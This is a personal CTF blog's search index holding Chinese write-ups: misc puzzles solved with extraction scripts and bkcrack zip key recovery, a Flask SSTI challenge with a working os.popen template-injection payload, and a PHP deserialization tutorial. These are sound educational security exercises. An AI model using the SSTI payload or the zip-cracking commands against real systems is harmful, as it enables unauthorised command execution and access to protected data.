<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>2025春秋杯冬季赛</title>
    <url>/2025/01/21/2025%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B/</url>
    <content><![CDATA[<p>菜鸟第一次打这种公开赛，感觉被橄榄了，第二天两个pyjail是一点办法都没有啊。。。</p>
<p>听C3师傅说这还不算是上强度的</p>
<p>而且准备转型Web却只做出来一个签到属于是。。有点丢人了</p>
<p>还是要多练，下次努力不啃Misc老底</p>
<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="简单算术："><a href="#简单算术：" class="headerlink" title="简单算术："></a>简单算术：</h2><p>根据提示，想想异或，直接尝试Cyberchef一把梭</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250117150938338.png" alt="image-20250117150938338"></p>
<h2 id="See-anything-in-these-pics"><a href="#See-anything-in-these-pics" class="headerlink" title="See anything in these pics?"></a>See anything in these pics?</h2><p>附件给了一个压缩包和一张阿兹特克码</p>
<p>解析得到</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250117152921150.png" alt="image-20250117152921150"></p>
<p>怀疑是压缩包的密码，带入解压压缩包，解压成功，得到一张jpg</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/YVL.jpg" alt="YVL"></p>
<p>看图片结合提示(图片不止两张)猜测一共有三张图，打开010查一下，发现PNG头<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250117153320612.png" alt="image-20250117153320612"></p>
<p>foremost提取一下发现是全黑的，猜测是crc校验错误，打开010发现报错检验猜想，最后随波逐流直接出(也可以直接随波逐流一把梭)</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250117184730714.png" alt="image-20250117184730714"></p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/00000149-%E4%BF%AE%E5%A4%8D%E9%AB%98%E5%AE%BD.png" alt="00000149-修复高宽"></p>
<h2 id="压力大，写个脚本吧"><a href="#压力大，写个脚本吧" class="headerlink" title="压力大，写个脚本吧"></a>压力大，写个脚本吧</h2><p>先试着解压几个包，把给的密文base64解码后是FGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFG</p>
<p>然后发现后面几个包的密文都是一样的，写个脚本直接爆</p>
<pre><code class="highlight python"><span class="keyword">import</span> zipfile
<span class="keyword">import</span> re
zipname = <span class="string">&quot;C:\\Users\\ayano\\Desktop\\output\\zip_100\\zip_99.zip&quot;</span>
<span class="keyword">while</span> <span class="literal">True</span>:
    <span class="keyword">if</span> zipname != <span class="string">&quot;C:\\Users\\ayano\\Desktop\\output\\zip_100\\zip_1.zip&quot;</span>:
        ts1 = zipfile.ZipFile(zipname)
        passwd =<span class="string">b&#x27;FGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFG&#x27;</span>
        ts1.extractall(<span class="string">&quot;C:\\Users\\ayano\\Desktop\\output\\zip_100\\&quot;</span>,pwd=passwd)
        zipname = <span class="string">&quot;C:\\Users\\ayano\\Desktop\\output\\zip_100\\&quot;</span>+ts1.namelist()[<span class="number">0</span>]
    <span class="keyword">else</span>:
        <span class="built_in">print</span>(<span class="string">&quot;find&quot;</span>)</code></pre>

<p>结果发现第95包密码换了。解压显示失败，那么直接获取txt的内容解码后解压压缩包。</p>
<pre><code class="highlight python"><span class="keyword">import</span> zipfile
<span class="keyword">import</span> os
<span class="keyword">import</span> base64

<span class="keyword">def</span> <span class="title function_">decode_password</span>(<span class="params">file_path</span>):
    <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:
        encoded_password = f.read().strip()
    decoded_password = base64.b64decode(encoded_password).decode(<span class="string">&#x27;utf-8&#x27;</span>)
    <span class="keyword">return</span> decoded_password
<span class="keyword">def</span> <span class="title function_">extract_zip</span>(<span class="params">zip_file, password, extract_to</span>):
    <span class="keyword">try</span>:
        <span class="keyword">with</span> zipfile.ZipFile(zip_file) <span class="keyword">as</span> zf:
            zf.extractall(path=extract_to, pwd=password.encode())
            <span class="built_in">print</span>(<span class="string">f&quot;解压成功: <span class="subst">&#123;zip_file&#125;</span> 到 <span class="subst">&#123;extract_to&#125;</span>&quot;</span>)
            <span class="keyword">return</span> zf.namelist()  
    <span class="keyword">except</span> (zipfile.BadZipFile, RuntimeError) <span class="keyword">as</span> e:
        <span class="built_in">print</span>(<span class="string">f&quot;解压失败: <span class="subst">&#123;zip_file&#125;</span>, 错误: <span class="subst">&#123;e&#125;</span>&quot;</span>)
        <span class="keyword">return</span> []
<span class="keyword">def</span> <span class="title function_">recursive_extract</span>(<span class="params">start_number=<span class="number">99</span>,parent_dir=<span class="string">&#x27;C:\\Users\\ayano\\Desktop\\output\\zip_100\\&#x27;</span></span>):
    current_number = start_number
    <span class="keyword">while</span> <span class="literal">True</span>:
        zip_filename = <span class="string">f&quot;C:\\Users\\ayano\\Desktop\\output\\zip_100\\zip_<span class="subst">&#123;current_number&#125;</span>.zip&quot;</span>
        password_filename = <span class="string">f&quot;C:\\Users\\ayano\\Desktop\\output\\zip_100\\password_<span class="subst">&#123;current_number&#125;</span>.txt&quot;</span>
        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(zip_filename):
            <span class="built_in">print</span>(<span class="string">f&quot;文件不存在: <span class="subst">&#123;zip_filename&#125;</span>&quot;</span>)
            <span class="keyword">break</span>
        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(password_filename):
            <span class="built_in">print</span>(<span class="string">f&quot;密码文件不存在: <span class="subst">&#123;password_filename&#125;</span>&quot;</span>)
            <span class="keyword">break</span>
        password = decode_password(password_filename)
        extracted_files = extract_zip(zip_filename, password,parent_dir)
        <span class="keyword">if</span> <span class="keyword">not</span> extracted_files:
            <span class="keyword">break</span>
        next_zip_file = <span class="literal">None</span>
        <span class="keyword">for</span> extracted_file <span class="keyword">in</span> extracted_files:
            <span class="keyword">if</span> extracted_file.endswith(<span class="string">&#x27;.zip&#x27;</span>):
                next_zip_file = extracted_file
                <span class="keyword">break</span>
        <span class="keyword">if</span> next_zip_file <span class="keyword">is</span> <span class="literal">None</span>:
            <span class="keyword">break</span>
        current_number -= <span class="number">1</span>
<span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:
    recursive_extract()</code></pre>

<p>解码后得到hint<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250117181031624.png" alt="image-20250117181031624"></p>
<p>应该是让我们把每个压缩包的密码解码后组成hex码产生一个png图片</p>
<p>根据我们第一个密码FG…..，显然不是文件头的格式，那么从0开始到99提取文件内容</p>
<pre><code class="highlight python"><span class="keyword">import</span> os
<span class="keyword">import</span> base64


<span class="keyword">def</span> <span class="title function_">decode_password</span>(<span class="params">file_path</span>):
    <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:
        encoded_password = f.read().strip()
    decoded_password = base64.b64decode(encoded_password).decode(<span class="string">&#x27;utf-8&#x27;</span>)
    <span class="keyword">return</span> decoded_password

<span class="keyword">def</span> <span class="title function_">extract_decoded_passwords</span>(<span class="params">start_number=<span class="number">0</span>, output_file=<span class="string">&#x27;decoded_passwords.txt&#x27;</span></span>):
    <span class="keyword">with</span> <span class="built_in">open</span>(output_file, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> output_f:
        current_number = start_number
        <span class="keyword">while</span> <span class="literal">True</span>:
            password_filename = <span class="string">f&quot;C:\\Users\\ayano\\Desktop\\output\\zip_100\\password_<span class="subst">&#123;current_number&#125;</span>.txt&quot;</span>
            <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(password_filename):
                <span class="built_in">print</span>(<span class="string">f&quot;密码文件不存在: <span class="subst">&#123;password_filename&#125;</span>&quot;</span>)
                <span class="keyword">break</span>
            decoded_password = decode_password(password_filename)
            output_f.write(<span class="string">f&quot;<span class="subst">&#123;decoded_password&#125;</span>&quot;</span>)
            <span class="built_in">print</span>(<span class="string">f&quot;密码_<span class="subst">&#123;current_number&#125;</span> 解码并保存。&quot;</span>)
            current_number += <span class="number">1</span>


<span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:
    extract_decoded_passwords(start_number=<span class="number">0</span>, output_file=<span class="string">&#x27;C:\\Users\\ayano\\Desktop\\1.txt&#x27;</span>)</code></pre>

<p>最终得到的在010中粘贴为hex码，得到一个二维码，扫一下</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250117181408150.png"></p>
<h2 id="Infinity"><a href="#Infinity" class="headerlink" title="Infinity"></a>Infinity</h2><p>首先看提示是不知道有什么用的</p>
<p>拿到一张png，用010查一下看到zip头</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250119164920069.png" alt="image-20250119164920069"></p>
<p>foremost提取一下</p>
<p>得到一个压缩包，在解压几次后发现是个嵌套的压缩包</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250119165111733.png" alt="image-20250119165111733">一共有7z,tar,zip三种类型的压缩包</p>
<p>同时注意到文件名有点可疑，留意一下，可能后续要用</p>
<p>脚本：</p>
<pre><code class="highlight plaintext">import os
import zipfile
import tarfile
import py7zr
import shutil


def extract_zip(zip_path, extract_dir):
    &quot;&quot;&quot;解压zip文件&quot;&quot;&quot;
    with zipfile.ZipFile(zip_path, &#x27;r&#x27;) as zip_ref:
        zip_ref.extractall(extract_dir)
        return zip_ref.namelist()  # 返回解压出来的文件列表


def extract_tar(tar_path, extract_dir):
    &quot;&quot;&quot;解压tar文件&quot;&quot;&quot;
    with tarfile.open(tar_path, &#x27;r&#x27;) as tar_ref:
        tar_ref.extractall(extract_dir)
        return tar_ref.getnames()  # 返回解压出来的文件列表


def extract_7z(archive_path, extract_dir):
    &quot;&quot;&quot;解压7z文件&quot;&quot;&quot;
    with py7zr.SevenZipFile(archive_path, mode=&#x27;r&#x27;) as archive_ref:
        archive_ref.extractall(extract_dir)
        return archive_ref.getnames()  # 返回解压出来的文件列表


def handle_compressed_file(file_path, extract_dir, output_txt):
    &quot;&quot;&quot;处理压缩包文件：解压并记录文件名（去掉后缀并连接）&quot;&quot;&quot;
    if file_path.endswith(&#x27;.zip&#x27;):
        extracted_files = extract_zip(file_path, extract_dir)
    elif file_path.endswith(&#x27;.tar&#x27;):
        extracted_files = extract_tar(file_path, extract_dir)
    elif file_path.endswith(&#x27;.7z&#x27;):
        extracted_files = extract_7z(file_path, extract_dir)
    else:
        print(f&quot;不支持的压缩格式：&#123;file_path&#125;&quot;)
        return []

    # 记录去掉后缀并连接的文件名
    with open(output_txt, &#x27;a&#x27;) as output_file:
        for file_name in extracted_files:
            name_without_extension = os.path.splitext(file_name)[0]  # 去掉后缀
            output_file.write(f&quot;&#123;name_without_extension&#125;\n&quot;)

    return extracted_files


def process_zip(zip_path, extract_dir, output_txt):
    &quot;&quot;&quot;处理zip文件并递归解压其中的压缩包&quot;&quot;&quot;
    # 解压当前zip文件并返回解压后的文件列表
    extracted_files = extract_zip(zip_path, extract_dir)

    for extracted_file in extracted_files:
        extracted_file_path = os.path.join(extract_dir, extracted_file)

        if os.path.isdir(extracted_file_path):
            continue  # 跳过目录

        # 如果解压出来的是压缩包，再进行递归处理
        if extracted_file.endswith((&#x27;.zip&#x27;, &#x27;.tar&#x27;, &#x27;.7z&#x27;)):
            # 解压嵌套压缩包并处理
            handle_compressed_file(extracted_file_path, extract_dir, output_txt)
            # 如果是嵌套的压缩包，再递归调用
            if extracted_file.endswith(&#x27;.zip&#x27;):
                process_zip(extracted_file_path, extract_dir, output_txt)
            elif extracted_file.endswith(&#x27;.tar&#x27;):
                process_tar(extracted_file_path, extract_dir, output_txt)
            elif extracted_file.endswith(&#x27;.7z&#x27;):
                process_7z(extracted_file_path, extract_dir, output_txt)

        else:
            handle_compressed_file(extracted_file_path, extract_dir, output_txt)

    # 删除当前处理的压缩包
    if zip_path.endswith(&#x27;.zip&#x27;):
        os.remove(zip_path)


def process_tar(tar_path, extract_dir, output_txt):
    &quot;&quot;&quot;处理tar文件并递归解压其中的压缩包&quot;&quot;&quot;
    extracted_files = extract_tar(tar_path, extract_dir)
    for extracted_file in extracted_files:
        extracted_file_path = os.path.join(extract_dir, extracted_file)

        if os.path.isdir(extracted_file_path):
            continue

        if extracted_file.endswith((&#x27;.zip&#x27;, &#x27;.tar&#x27;, &#x27;.7z&#x27;)):
            handle_compressed_file(extracted_file_path, extract_dir, output_txt)
            if extracted_file.endswith(&#x27;.zip&#x27;):
                process_zip(extracted_file_path, extract_dir, output_txt)
            elif extracted_file.endswith(&#x27;.tar&#x27;):
                process_tar(extracted_file_path, extract_dir, output_txt)
            elif extracted_file.endswith(&#x27;.7z&#x27;):
                process_7z(extracted_file_path, extract_dir, output_txt)

    # 删除当前处理的压缩包
    if tar_path.endswith(&#x27;.tar&#x27;):
        os.remove(tar_path)


def process_7z(archive_path, extract_dir, output_txt):
    &quot;&quot;&quot;处理7z文件并递归解压其中的压缩包&quot;&quot;&quot;
    extracted_files = extract_7z(archive_path, extract_dir)
    for extracted_file in extracted_files:
        extracted_file_path = os.path.join(extract_dir, extracted_file)

        if os.path.isdir(extracted_file_path):
            continue

        if extracted_file.endswith((&#x27;.zip&#x27;, &#x27;.tar&#x27;, &#x27;.7z&#x27;)):
            handle_compressed_file(extracted_file_path, extract_dir, output_txt)
            if extracted_file.endswith(&#x27;.zip&#x27;):
                process_zip(extracted_file_path, extract_dir, output_txt)
            elif extracted_file.endswith(&#x27;.tar&#x27;):
                process_tar(extracted_file_path, extract_dir, output_txt)
            elif extracted_file.endswith(&#x27;.7z&#x27;):
                process_7z(extracted_file_path, extract_dir, output_txt)

    # 删除当前处理的压缩包
    if archive_path.endswith(&#x27;.7z&#x27;):
        os.remove(archive_path)


def main():
    zip_path = r&#x27;C:\Users\ayano\Desktop\output\Infinity\output\zip\1.zip&#x27;
    extract_dir = r&#x27;C:\Users\ayano\Desktop\output\Infinity\output\zip\extracted&#x27;
    output_txt = r&#x27;C:\Users\ayano\Desktop\output\Infinity\output\zip\output.txt&#x27;

    if not os.path.exists(extract_dir):
        os.makedirs(extract_dir)

    # 开始处理压缩包
    with open(output_txt, &#x27;w&#x27;) as output_file:
        output_file.write(&quot;&quot;)
    process_zip(zip_path, extract_dir, output_txt)


if __name__ == &quot;__main__&quot;:
    main()</code></pre>

<p>再对提出来的文件名做两种处理</p>
<pre><code class="highlight plaintext">def reverse_file_names(input_txt, output_txt):
    &quot;&quot;&quot;读取文件名并将其从后往前连接&quot;&quot;&quot;
    with open(input_txt, &#x27;r&#x27;) as infile:
        file_names = infile.readlines()

    # 去掉换行符并从后往前连接
    reversed_file_names = [name.strip() for name in reversed(file_names)]

    # 将连接后的文件名写入新文件
    with open(output_txt, &#x27;w&#x27;) as outfile:
        outfile.write(&quot;连接后的文件名（从后往前）：\n&quot;)
        outfile.write(&quot;&quot;.join(reversed_file_names))  # 使用空格连接文件名
def remove_newlines_and_connect(input_txt, output_txt):
    &quot;&quot;&quot;读取文件名并去掉换行符，连接所有文件名&quot;&quot;&quot;
    with open(input_txt, &#x27;r&#x27;) as infile:
        # 读取所有行并去掉换行符
        file_names = infile.read().splitlines()

    # 将文件名用空格连接
    connected_file_names = &quot;&quot;.join(file_names)

    # 将连接后的文件名写入新文件
    with open(output_txt, &#x27;w&#x27;) as outfile:
        outfile.write(&quot;连接后的文件名（去掉换行符）：\n&quot;)
        outfile.write(connected_file_names)  # 直接写入连接后的字符串

def main():
    input_txt = r&#x27;C:\Users\ayano\Desktop\output\Infinity\output\zip\output.txt&#x27;
    output1_txt = r&#x27;C:\Users\ayano\Desktop\output\Infinity\output\zip\output_reversed.txt&#x27;
    output2_txt = r&#x27;C:\Users\ayano\Desktop\output\Infinity\output\zip\output_simple.txt&#x27;
    reverse_file_names(input_txt, output1_txt)
    remove_newlines_and_connect(input_txt, output2_txt)

if __name__ == &quot;__main__&quot;:
    main()</code></pre>

<p>根据提示BASE58-Ripple、SM4-ECB</p>
<p>先后尝试顺序的和逆序的</p>
<p>最后逆序的得到以下</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250119165516321.png" alt="image-20250119165516321"></p>
<p>看一眼是png的文件头，在010以16进制粘贴得到一张图片</p>
<p><img src="/2025/01/21/2025%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B/Users/ayano/Desktop/flag2.png" alt="flag"></p>
<p>在谷歌搜图后判断出是 DataMatrix码</p>
<p>在线工具解决 <img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250119170503355.png" alt="image-20250119170503355"></p>
<h2 id="音频的秘密"><a href="#音频的秘密" class="headerlink" title="音频的秘密"></a>音频的秘密</h2><p>解压得到一个wav文件</p>
<p>根据提示deepsound和弱口令</p>
<p>试一下123？</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250119181253709.png" alt="image-20250119181253709"></p>
<p>运气比较好直接出来了</p>
<p>提取zip后发现需要密码打开</p>
<p>在010查过之后发现是真加密<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250119181451213.png" alt="image-20250119181451213"></p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250119181524239.png" alt="image-20250119181524239"></p>
<p>没有提示，直接尝试明文爆破，已知png文件头，以这个为明文开始爆</p>
<pre><code class="highlight bash"><span class="built_in">echo</span> 89504E470D0A1A0A0000000D49484452 | xxd -r -ps &gt; png_header
bkcrack -C flag.zip -c flag.png -p png_header -o 0</code></pre>

<p>然后得到密钥 <code>29d29517 0fa535a9 abc67696</code></p>
<pre><code class="highlight bash">bkcrack -C flag.zip -c flag.png -k 29d29517 0fa535a9 abc67696 -d flag.png</code></pre>

<p>得到flag.png</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/flag.png" alt="flag">通过stegsolve看一下有没有lsb隐写</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/893940eded9dc333fe7e104a38fccaf5.png" alt="893940eded9dc333fe7e104a38fccaf5"></p>
<p>左上角一看肯定有lsb稳了，zsteg一跑</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250119203932034.png" alt="image-20250119203932034"></p>
<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="easy-flask"><a href="#easy-flask" class="headerlink" title="easy_flask"></a>easy_flask</h2><p>根据提示想想flask,应该是SSTI漏洞</p>
<p>先试着打一下，看看有没有绕过</p>
<pre><code class="highlight plaintext">&#123;&#123; config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;ls&#x27;).read() &#125;&#125;</code></pre>

<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250117162602849.png" alt="image-20250117162602849"></p>
<p>直接爆了，那就ls换cat flag解决</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250117162704054.png" alt="image-20250117162704054"></p>
]]></content>
      <tags>
        <tag>-CTF -misc -WP</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP反序列化</title>
    <url>/2025/03/09/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    <content><![CDATA[<h1 id="PHP反序列化学习"><a href="#PHP反序列化学习" class="headerlink" title="PHP反序列化学习"></a>PHP反序列化学习</h1><h2 id="入门之前"><a href="#入门之前" class="headerlink" title="入门之前"></a>入门之前</h2><p>首先要知道PHP是一门面向对象的语言</p>
<p>所以会碰到类，对象之类的概念</p>
<p>稍微补充一点罢，不然会听不懂的()</p>
<ul>
<li><strong>类</strong> − 定义了一件事物的抽象特点。类的定义包含了数据的形式以及对数据的操作。</li>
<li><strong>对象</strong> − 是类的实例。</li>
<li><strong>成员变量</strong> − 定义在类内部的变量。该变量的值对外是不可见的，但是可以通过成员函数访问，在类被实例化为对象后，该变量即可成为对象的<strong>属性</strong>。</li>
<li><strong>成员函数</strong> − 定义在类的内部，可用于访问对象的数据。</li>
<li><strong>继承</strong> − 继承性是子类自动共享父类数据结构和方法的机制，这是类之间的一种关系。在定义和实现一个类的时候，可以在一个已经存在的类的基础之上来进行，把这个已经存在的类所定义的内容作为自己的内容，并加入若干新的内容。</li>
<li><strong>父类</strong> − 一个类被其他类继承，可将该类称为父类，或基类，或超类。</li>
<li><strong>子类</strong> − 一个类继承其他类称为子类，也可称为派生类。</li>
<li><strong>多态</strong> − 多态性是指相同的函数或方法可作用于多种类型的对象上并获得不同的结果。不同的对象，收到同一消息可以产生不同的结果，这种现象称为多态性。</li>
<li><strong>重载</strong> − 简单说，就是函数或者方法有同样的名称，但是参数列表不相同的情形，这样的同名不同参数的函数或者方法之间，互相称之为重载函数或者方法。</li>
<li><strong>抽象性</strong> − 抽象性是指将具有一致的数据结构（属性）和行为（操作）的对象抽象成类。一个类就是这样一种抽象，它反映了与应用有关的重要性质，而忽略其他一些无关内容。任何类的划分都是主观的，但必须与具体的应用有关。</li>
<li><strong>封装</strong> − 封装是指将现实世界中存在的某个客体的属性与行为绑定在一起，并放置在一个逻辑单元内。</li>
<li><strong>构造函数</strong> − 主要用来在创建对象时初始化对象， 即为对象成员变量赋初始值，总与new运算符一起使用在创建对象的语句中。</li>
<li><strong>析构函数</strong> − 析构函数(destructor) 与构造函数相反，当对象结束其生命周期时（例如对象所在的函数已调用完毕），系统自动执行析构函数。析构函数往往用来做”清理善后” 的工作（例如在建立对象时用new开辟了一片内存空间，应在退出前在析构函数中用delete释放）。</li>
</ul>
<pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="class"><span class="keyword">class</span> <span class="title">Site</span> </span>&#123;<span class="comment">//类</span>
  <span class="comment">/* 成员变量 */</span>
  <span class="keyword">var</span> <span class="variable">$url</span>;
  <span class="keyword">var</span> <span class="variable">$title</span>;
  
  <span class="comment">/* 成员函数 */</span>
  <span class="function"><span class="keyword">function</span> <span class="title">setUrl</span>(<span class="params"><span class="variable">$par</span></span>)</span>&#123;
     <span class="variable language_">$this</span>-&gt;url = <span class="variable">$par</span>;
  &#125;
  
  <span class="function"><span class="keyword">function</span> <span class="title">getUrl</span>(<span class="params"></span>)</span>&#123;
     <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;url . PHP_EOL;
  &#125;
  
  <span class="function"><span class="keyword">function</span> <span class="title">setTitle</span>(<span class="params"><span class="variable">$par</span></span>)</span>&#123;
     <span class="variable language_">$this</span>-&gt;title = <span class="variable">$par</span>;
  &#125;
  
  <span class="function"><span class="keyword">function</span> <span class="title">getTitle</span>(<span class="params"></span>)</span>&#123;
     <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;title . PHP_EOL;
  &#125;
&#125;
<span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Site</span>();<span class="comment">//创建对象</span>
<span class="variable">$a</span>-&gt;<span class="title function_ invoke__">setTitle</span>(<span class="string">&#x27;AyaN0&#x27;</span>);<span class="comment">//调用成员方法</span>
<span class="comment">//或者$a-&gt;setTitle=&#x27;AyaN0&#x27;;</span>

<span class="meta">?&gt;</span></code></pre>

<h2 id="pop链构造"><a href="#pop链构造" class="headerlink" title="pop链构造"></a>pop链构造</h2><h3 id="construct-和-destruct"><a href="#construct-和-destruct" class="headerlink" title="__construct() 和 __destruct()"></a><code>__construct()</code> 和 <code>__destruct()</code></h3><p><code>__construct</code>：当对象<strong>创建</strong>时会自动调用，注意是创建的时候，也就是说有<code>new</code>的时候就会调用，在<code>unserialize</code>时是不会被自动调用的</p>
<pre><code class="highlight plaintext">__destruct()`：当对象被销毁时会自动调用；当新对象创建后，它后面一定会被自动销毁，也就是调用`__construct`后一定会调用`__destruct`；或者我们直接传入一个对象，它后面被销毁时也会调用`__destruct</code></pre>

<p>可以看到，创建对象e时调用了<code>__construct</code>，然后输出序列化后的对象<code>t</code>，最后在销毁对象<code>t</code>时调用了<code>__destruct</code></p>
<h3 id="sleep-和-wakeup"><a href="#sleep-和-wakeup" class="headerlink" title="__sleep() 和 __wakeup()"></a><code>__sleep()</code> 和 <code>__wakeup()</code></h3><p><code>__sleep()</code> ：在对象被序列化<strong>之前</strong>被调用，就是说看到<code>serialize</code>时就会被调用，而且是先调用后再执行序列化</p>
<p><code>__wakeup()</code>: 将在<strong>字符串被反序列化之后被立即调用</strong>，就是说<strong>看到</strong><code>unserialize</code><strong>后就会被立即调用</strong></p>
<p>在看到<code>serialize($b)</code>后，它是先调用了<code>__sleep()</code>魔法函数，然后才执行了<code>echo</code>，输出了字符串</p>
<p>直接输入了字符串，当它执行了<code>unserialize</code>转换成对象后，就会最先调用<code>__wakeup()</code>，它的优先级最高</p>
<h3 id="toString-NaN"><a href="#toString-NaN" class="headerlink" title="__toString()"></a><code>__toString()</code></h3><p><code>__toString()</code>魔术方法是最为最要的，在构造pop链中它往往是很关键的一环，在很多种情况下都会被调用，主要是下面这些：</p>
<ol>
<li><code>echo($obj)</code>或<code>print($obj)</code><strong>打印对象</strong>时会触发</li>
<li><strong>反序列化对象</strong>与字符串连接时</li>
<li><strong>反序列化对象</strong>参与格式化字符串时</li>
<li><strong>反序列化对象</strong>与<strong>字符串</strong>进行<code>preg_match</code>正则匹配)，因为php进行弱比较时会转换参数类型，相当于都转换成字符串进行比较</li>
<li><strong>反序列化对象</strong>参与<strong>格式化sql语句</strong>时，绑定参数时(用的少)</li>
<li><strong>反序列化对象</strong>经过<strong>php字符串函数</strong>时，如<code>strlen()</code>，<code>addslashes()</code>时(用的少)</li>
<li>在<code>in_array()</code>方法中，第一个参数是<strong>反序列化对象</strong>，第二个参数的数组中有<code>tostring</code>返回的字符串的时候<code>tostring</code>会被调用</li>
<li><strong>反序列化对象</strong>作为<code>class_exists()</code>的参数的时候(用的少)</li>
</ol>
<p>通过看它被调用的情况，不难总结出，当对象被当成了字符串的时候，<code>__toString()</code>就会被调用，无论是将对象打印出来，还是将对象去与字符串进行比较，它都会被调用；这里要注意的是，必须要操作的是<strong>对象</strong>的时候，才会被调用</p>
<p>新建了对象<code>t</code>就直接打印它，照理说肯定是不会有任何回显的，因为只有字符串能被打印，对象肯定是不能被直接打印的，需要先将它序列化成字符串后才可以打印；但我们这直接打印发现它居然有输出，就是因为它按照操作字符串的方法去操作了对象，所以说调用了<code>__toString()</code>，然后将它的返回值输出了出来</p>
<h3 id="invoke"><a href="#invoke" class="headerlink" title="__invoke()"></a><code>__invoke()</code></h3><p><code>__invoke</code>：当尝试以调用<strong>函数</strong>的方式调用一个<strong>对象</strong>时，<code>__invoke()</code>方法会被自动调用，而调用函数的方式就是在后面加上<code>()</code>，当我们看到像<code>return $function();</code>这种语句时，就应该意识到后面可能会调用<code>__invoke()</code>，下图是直接在对象后面加<code>()</code>调用</p>
<p>需要注意的是，这个魔术方法只在<strong>PHP 5.3.0 及以上版本</strong>有效</p>
<h3 id="get-和-set"><a href="#get-和-set" class="headerlink" title="__get() 和 __set()"></a><code>__get()</code> 和 <code>__set()</code></h3><p><code>__get()</code>：从<strong>不可访问的属性中</strong>读取数据，或者说是<strong>调用一个类及其父类方法中未定义属性时</strong></p>
<p><code>__set()</code>：当给一个未定义的属性赋值时，或者修改一个不能被修改的属性时(<code>private</code> <code>protected</code>)(用的不多)</p>
<p><code>echo</code>语句调用了<code>__toString()</code>，然后它返回的是当前对象的<code>t</code>属性，但我们是没有定义<code>t</code>这个属性的，所以说会调用<code>__get()</code>，然后将返回值打印出来</p>
<h3 id="call-和-callStatic"><a href="#call-和-callStatic" class="headerlink" title="__call() 和 __callStatic()"></a><code>__call()</code> 和 <code>__callStatic()</code></h3><p><code>__call</code>：在对象中调用类中不存在的方法时，或者是不可访问方法时被调用</p>
<p><code>__callStatic</code>：在静态上下文中调用一个不可访问静态方法时被调用(用的不多)</p>
<p>比如说像这段代码，我们调用对象<code>t</code>中的方法<code>t2</code>，但因为类中没有方法<code>t2</code>，所以说就调用了<code>__call()</code></p>
<h2 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h2><p>绕过_wakeup:当序列化后对象的参数列表中成员个数和实际个数不符合时会绕过 __wakeup()</p>
<p>&#x2F;&#x2F;详见[SWPUCTF 2021 新生赛]no_wakeup</p>
]]></content>
      <tags>
        <tag>-web -CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>BUU—MISC刷题记录</title>
    <url>/2024/12/20/BUU%E2%80%94MISC%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<p>浅浅记录一下BUU里感觉比较有价值的题目</p>
<h2 id="0荷兰宽带泄露"><a href="#0荷兰宽带泄露" class="headerlink" title="0荷兰宽带泄露"></a>0荷兰宽带泄露</h2><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207192240105.png" alt="image-20241207192240105"></p>
<p>解压后发现一个bin文件，第一次碰到不知道怎么处理，看了一下别的师傅的wp了解到一种新的工具：<code>RouterPassView</code>(用于破解宽带数据文件的密码)，题目没有提示Flag</p>
<p>那试试用户名<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207192618872.png" alt="image-20241207192618872"></p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207192553975.png" alt="image-20241207192553975"></p>
